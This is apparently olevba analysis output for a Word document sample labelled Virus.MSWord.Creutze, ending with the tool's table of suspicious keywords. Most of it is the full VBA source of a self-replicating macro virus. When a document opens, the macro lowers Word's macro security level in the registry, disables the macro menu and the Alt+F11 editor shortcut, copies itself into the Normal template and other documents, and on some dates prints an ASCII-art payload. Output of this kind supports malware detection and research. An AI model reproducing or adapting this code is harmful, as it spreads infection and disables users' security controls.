olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Creutze-8be246774c471a0660f811ed0d4fc3d9bc0e0c3d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Creutze-8be246774c471a0660f811ed0d4fc3d9bc0e0c3d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Tools").Controls("Macro").Enabled = False
Normal_PathName = NormalTemplate.FullName
Attribs = GetAttr(Normal_PathName) And vbReadOnly
If Attribs = 1 Then
    SetAttr Normal_PathName, vbArchive Or vbNormal
Else
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
End If
Set xActual = ActiveDocument.VBProject.VBComponents.Item(1)
Set xNormal = NormalTemplate.VBProject.VBComponents.Item(1)
Code_Normal = xNormal.CodeModule.CountOfLines
Code_Actual = xActual.CodeModule.CountOfLines
If xNormal.Name <> "Creutzfeldt_Jakob" And Attribs <> 1 Then
    xNormal.Name = "Creutzfeldt_Jakob"
    Do While Code_Normal > 0
        xNormal.CodeModule.DeleteLines 1
        Code_Normal = Code_Normal - 1
    Loop
    Counter = 1
    Do While xActual.CodeModule.Lines(Counter, 1) <> ""
        xNormal.CodeModule.InsertLines Counter, xActual.CodeModule.Lines(Counter, 1)
        Counter = Counter + 1
    Loop
ElseIf xActual.Name <> "Creutzfeldt_Jakob" Then
    xActual.Name = "Creutzfeldt_Jakob"
    Do While Code_Actual > 0
        xActual.CodeModule.DeleteLines 1
        Code_Actual = Code_Actual - 1
    Loop
    Counter = 1
    Do While xNormal.CodeModule.Lines(Counter, 1) <> ""
        xActual.CodeModule.InsertLines Counter, xNormal.CodeModule.Lines(Counter, 1)
        Counter = Counter + 1
    Loop
End If
Randomize
PayDay = Int((31 - 1 + 1) * Rnd() + 1)
If PayDay = Day(Now) And ((Minute(Now) <= 15) Or (Minute(Now) >= 30 And Minute(Now) <= 45)) Then
    Selection.Font.Name = "Courier"
    Selection.Font.Size = 10
    Selection.Font.Bold = True
    Selection.Font.Color = wdColorAutomatic
    Selection.TypeText "          (__)          (__)          (__)          (__)          (__)"
    Selection.TypeParagraph
    Selection.TypeText "          (@@)          (@@)          (@@)          (@@)          (@@)"
    Selection.TypeParagraph
    Selection.TypeText "   /-------\/    /-------\/    /-------\/    /-------\/    /-------\/"
    Selection.TypeParagraph
    Selection.TypeText "  / |     ||    / |     ||    / |     ||    / |     ||    / |     ||"
    Selection.TypeParagraph
    Selection.TypeText " *  ||----||   *  ||----||   *  ||----||   *  ||----||   *  ||----||"
    Selection.TypeParagraph
    Selection.TypeText "    ^^    ^^      ^^    ^^      ^^    ^^      ^^    ^^      ^^    ^^"
    Selection.TypeParagraph
    Selection.Font.Color = wdColorBlue
    Selection.TypeText "W2000M/Creutzfeldt-Jakob Macro Virus"
    Selection.TypeParagraph
    Selection.TypeText "(c)2001 by Tokugawa Ieyasu"
    Selection.TypeParagraph
End If
If InStr(1, ActiveDocument.Name, "Document") = False Then
    ActiveDocument.SaveAs ActiveDocument.FullName
Else
    ActiveDocument.Saved = True
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

